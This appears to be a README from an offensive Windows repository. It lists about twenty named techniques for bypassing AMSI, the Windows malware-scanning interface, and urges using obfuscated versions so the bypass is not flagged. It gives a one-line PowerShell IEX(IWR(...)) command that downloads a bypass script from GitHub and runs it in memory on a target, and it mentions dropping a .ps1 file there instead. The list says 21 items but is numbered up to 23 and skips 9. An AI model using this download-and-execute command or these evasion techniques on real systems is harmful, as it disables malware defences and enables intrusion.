List of 21 AMSI by pass techniques, implemented the AMSI bypasses defined in: https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

Make sure to use the obfuscated verison of the AMSI bypass, since we need to trick the AMSI into not flagging the AMSI bypass script as malicious

1. ScriptBlock Smuggling
2. Reflection ScanContent Change
3. Using Hardware Breakpoints
4. Using CLR hooking
5. Patch the provider’s DLL of Microsoft MpOav.dll
6. Scanning Interception and Provider function patching
7. Patching AMSI AmsiScanBuffer by rasta-mouse
8. Patching AMSI AmsiOpenSession
10. Amsi ScanBuffer Patch from -> https://www.contextis.com/de/blog/amsi-bypass
11. Forcing an error
12. Disable Script Logging
13. Amsi Buffer Patch - In memory
14. Same as 6 but integer Bytes instead of Base64
15. Using Matt Graeber's Reflection method
16. Using Matt Graeber's Reflection method with WMF5 autologging bypass
17. Using Matt Graeber's second Reflection method
18. Using Cornelis de Plaa's DLL hijack method
19. Use Powershell Version 2 - No AMSI Support there
20. Nishang all in one
21. Adam Chesters Patch
22. Modified version of 3. Amsi ScanBuffer - no CSC.exe compilation
23. Patching the AmsiScanBuffer address in System.Management.Automation.dll


(not stealthy since network calls will get logged)
The scripts can either be run in powershell by fetching them from github and then executing them like so: 
`IEX(IWR("https://raw.githubusercontent.com/Rasmus3650/WindowsHacking/Main/AMSI/scripts/in_memory_patching/amsibp_working.ps1"))`

We can also create a new .ps1 file on the target and then executing this file with `./target_file.ps1` in powershell.

The powershell instance should now work without ever asking AMSI whether or not the code we are running is malicious 